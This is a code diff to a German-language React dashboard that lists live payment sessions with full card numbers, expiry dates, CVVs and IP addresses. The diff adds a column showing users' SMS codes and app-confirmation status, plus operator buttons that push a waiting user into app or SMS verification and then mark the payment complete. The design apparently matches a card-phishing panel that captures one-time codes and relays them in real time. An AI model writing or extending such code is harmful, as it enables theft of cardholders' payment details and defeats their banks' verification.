@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { CreditCard, Eye, EyeOff, Clock, Users } from 'lucide-react';
+import { CreditCard, Eye, EyeOff, Clock, Users, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
 import { ProtectedRoute } from '@/components/ProtectedRoute';
 import { SidebarProvider } from '@/components/ui/sidebar';
 import { AppSidebar } from '@/components/AppSidebar';
@@ -19,6 +19,10 @@ interface PaymentSession {
   last_seen: string;
   is_active: boolean;
   user_ip: string;
+  verification_method: string;
+  verification_status: string;
+  sms_code: string;
+  admin_action_pending: boolean;
   orders: {
     order_number: number;
     final_price: number;
@@ -215,6 +219,59 @@ const Payments = () => {
     }
   };
 
+  const handleVerificationAction = async (sessionId: string, method: string) => {
+    try {
+      await supabase.functions.invoke('payment-sessions/set-verification-method', {
+        body: { sessionId, method }
+      });
+      toast({
+        title: "Aktion erfolgreich",
+        description: `Verifikationsmethode "${method}" wurde gesetzt.`,
+      });
+    } catch (error) {
+      toast({
+        title: "Fehler",
+        description: "Aktion konnte nicht ausgeführt werden.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const handleCompletePayment = async (sessionId: string) => {
+    try {
+      await supabase.functions.invoke('payment-sessions/complete-payment', {
+        body: { sessionId }
+      });
+      toast({
+        title: "Zahlung abgeschlossen",
+        description: "Der Nutzer wird zur Bestätigungsseite weitergeleitet.",
+      });
+    } catch (error) {
+      toast({
+        title: "Fehler",
+        description: "Zahlung konnte nicht abgeschlossen werden.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const getVerificationStatusBadge = (status: string) => {
+    switch (status) {
+      case 'waiting':
+        return <Badge variant="secondary">Wartend</Badge>;
+      case 'app_confirmed':
+        return <Badge variant="default">App bestätigt</Badge>;
+      case 'sms_sent':
+        return <Badge variant="outline">SMS gesendet</Badge>;
+      case 'sms_confirmed':
+        return <Badge variant="default">SMS bestätigt</Badge>;
+      case 'completed':
+        return <Badge variant="default" className="bg-green-600">Abgeschlossen</Badge>;
+      default:
+        return <Badge variant="secondary">Unbekannt</Badge>;
+    }
+  };
+
   const sessionsToDisplay = showInactive ? inactiveSessions : activeSessions;
 
   return (
@@ -331,8 +388,12 @@ const Payments = () => {
                             <TableHead>Kartennummer</TableHead>
                             <TableHead>Ablauf</TableHead>
                             <TableHead>CVV</TableHead>
+                            <TableHead>Verifikation</TableHead>
+                            <TableHead>SMS-Code</TableHead>
+                            <TableHead>App-Status</TableHead>
                             <TableHead>Letzte Aktivität</TableHead>
                             <TableHead>Dauer</TableHead>
+                            <TableHead>Aktionen</TableHead>
                           </TableRow>
                         </TableHeader>
                         <TableBody>
@@ -394,11 +455,72 @@ const Payments = () => {
                               >
                                 {session.orders?.cvv || '-'}
                               </TableCell>
+                              <TableCell>
+                                {getVerificationStatusBadge(session.verification_status)}
+                              </TableCell>
+                              <TableCell className="font-mono text-center">
+                                {session.verification_method === 'sms_confirmation' && session.sms_code 
+                                  ? session.sms_code 
+                                  : '-'}
+                              </TableCell>
+                              <TableCell className="text-center">
+                                {session.verification_method === 'app_confirmation' ? (
+                                  <div className={`w-3 h-3 rounded-full mx-auto ${
+                                    session.verification_status === 'app_confirmed' 
+                                      ? 'bg-green-500' 
+                                      : 'bg-red-500'
+                                  }`} />
+                                ) : '-'}
+                              </TableCell>
                               <TableCell className="whitespace-nowrap text-sm text-muted-foreground">
                                 {formatLastSeen(session.last_seen)}
                               </TableCell>
                               <TableCell className="whitespace-nowrap text-sm">
                                 {formatDuration(session.created_at, session.last_seen)}
+                              </TableCell>
+                              <TableCell>
+                                <div className="flex flex-col space-y-2 min-w-[200px]">
+                                  {session.verification_status === 'waiting' && session.verification_method === 'pending' && (
+                                    <>
+                                      <Button
+                                        size="sm"
+                                        variant="outline"
+                                        onClick={() => handleVerificationAction(session.session_id, 'app_confirmation')}
+                                        className="flex items-center space-x-1"
+                                      >
+                                        <Smartphone className="w-3 h-3" />
+                                        <span>App-Bestätigung</span>
+                                      </Button>
+                                      <Button
+                                        size="sm"
+                                        variant="outline"
+                                        onClick={() => handleVerificationAction(session.session_id, 'sms_confirmation')}
+                                        className="flex items-center space-x-1"
+                                      >
+                                        <MessageSquare className="w-3 h-3" />
+                                        <span>SMS-Bestätigung</span>
+                                      </Button>
+                                      <Button
+                                        size="sm"
+                                        variant="outline"
+                                        onClick={() => handleVerificationAction(session.session_id, 'choice_required')}
+                                        className="flex items-center space-x-1"
+                                      >
+                                        <CheckCircle className="w-3 h-3" />
+                                        <span>Auswahlmöglichkeit</span>
+                                      </Button>
+                                    </>
+                                  )}
+                                  {(session.verification_status === 'app_confirmed' || session.verification_status === 'sms_confirmed') && (
+                                    <Button
+                                      size="sm"
+                                      onClick={() => handleCompletePayment(session.session_id)}
+                                      className="bg-green-600 hover:bg-green-700 text-white"
+                                    >
+                                      Zahlung bestätigen
+                                    </Button>
+                                  )}
+                                </div>
                               </TableCell>
                             </TableRow>
                           ))}
